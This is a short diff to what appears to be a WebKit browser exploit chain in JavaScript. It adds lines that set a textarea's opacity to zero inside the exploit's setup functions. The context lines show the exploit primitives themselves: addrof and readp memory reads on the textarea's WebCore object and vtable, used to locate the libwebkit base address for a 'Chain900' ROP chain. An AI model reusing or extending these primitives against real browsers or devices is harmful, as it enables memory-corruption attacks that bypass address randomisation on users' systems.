@@ -171,6 +171,7 @@ export const gadgets = new Map();
 
 function get_bases() {
     const textarea = document.createElement('textarea');
+       textarea.style.opacity = '0'; // Set the opacity to 0
     const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
     const textarea_vtable = webcore_textarea.readp(0);
     const libwebkit_base = find_base(textarea_vtable, true, true);
@@ -301,6 +302,7 @@ export class Chain900 extends Chain900Base {
         super();
 
         const textarea = document.createElement('textarea');
+        textarea.style.opacity = '0'; // Set the opacity to 0
         this.textarea = textarea;
         const js_ta = mem.addrof(textarea);
         const webcore_ta = js_ta.readp(0x18);
